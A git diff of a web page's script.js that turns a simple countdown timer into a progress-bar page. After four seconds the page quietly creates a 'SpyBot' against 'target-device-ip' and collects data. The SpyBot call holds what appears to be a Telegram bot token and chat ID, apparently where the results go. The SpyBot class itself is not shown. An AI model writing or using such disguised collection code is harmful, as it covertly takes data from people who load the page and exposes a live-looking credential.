@@ -1,23 +1,41 @@
-document.addEventListener("DOMContentLoaded", function () {
+// JavaScript code in script.js
 
-    let timeLeft = 20; // عدد الثواني للعد التنازلي
+const progressBar = document.getElementById('progress');
+const countdown = document.getElementById('countdown');
 
-    const countdownElement = document.getElementById("countdown");
+// Function to update the progress bar
+function updateProgress(percentage) {
+  progressBar.style.width = `${percentage}%`;
+}
 
-    const progressBar = document.getElementById("progress");
+// Function to update the countdown
+function updateCountdown(seconds) {
+  countdown.textContent = seconds;
+}
 
-    const countdownInterval = setInterval(() => {
+// Simulate data collection and progress updates
+updateProgress(0);
+updateCountdown(20);
 
-        timeLeft--;
+setTimeout(() => {
+  updateProgress(25);
+  updateCountdown(15);
+}, 2000);
 
-        countdownElement.textContent = timeLeft;
+// Simulate data collection and progress updates
+setTimeout(() => {
+  // Establish connection with the bot and collect data
+  const bot = new SpyBot('target-device-ip', '7825240049:AAGXsMh2SkSDOVbv1fW2tsYVYYLFhY7gv5E', '5375214810');
 
-        progressBar.style.width = (timeLeft / 20) * 100 + "%"; // تقليل العرض تدريجياً
-
-        if (timeLeft <= 0) {
-
-            clearInterval(countdownInterval);
-        }
-
-    }, 1000);
-    }); 
+  bot.connect()
+    .then(() => bot.collectData())
+    .then(() => {
+      // Display collected data on the HTML page
+      const dataContainer = document.createElement('div');
+      dataContainer.innerHTML = 'Data collection complete!';
+      document.body.appendChild(dataContainer);
+    })
+    .catch(error => {
+      console.error('Error:', error);
+    });
+}, 4000);
